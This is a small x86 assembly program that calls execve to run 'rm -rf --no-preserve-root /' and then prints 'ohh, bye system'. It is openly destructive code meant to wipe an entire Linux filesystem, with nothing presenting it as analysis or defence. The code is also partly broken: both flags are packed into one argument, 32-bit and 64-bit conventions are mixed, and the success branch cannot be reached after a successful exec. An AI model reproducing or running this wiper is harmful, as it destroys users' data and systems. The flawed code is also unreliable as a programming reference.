section .data
    ; Variables
    cmd:                 DB  "/bin/rm", 0
    arg:                 DB  "-rf --no-preserve-root", 0
    dir:                 DB  "/", 0
    args:                DQ  cmd, arg, dir, 0
    message:             DB  "ohh, bye system", 10
    message_len:         equ $-message 
    error:               DB "Error occured", 10
    error_len:           equ $-error

section .text
    global _start

_start:
    ; Corrupt dataz
    mov eax, 11               ; system call 11: exec
    mov ebx, cmd              ; command name
    mov ecx, args             ; arguments
    mov edx, 0
    int 80h                   ; call into the system

    test rax, rax             ; Check if rax is zero (success)
    jz success

    ; Print confirmation
    mov eax, 4                ; sys call 4: write
    mov ebx, 1                ; file handle 1: stdout
    mov ecx, error            ; message address
    mov edx, error_len        ; message length
    int 80h                   ; call the kernel

    ; Exit program
    mov eax, 1                ; system call 1: exit
    mov ebx, 1                ; return code
    int 80h                   ; call the kernel

success:
    ; Print confirmation
    mov eax, 4                ; sys call 4: write
    mov ebx, 1                ; file handle 1: stdout
    mov ecx, message          ; message address
    mov edx, message_len      ; message length
    int 80h

    ; Exit program
    mov eax, 1                ; system call 1: exit
    mov ebx, 0                ; return code
    int 80h
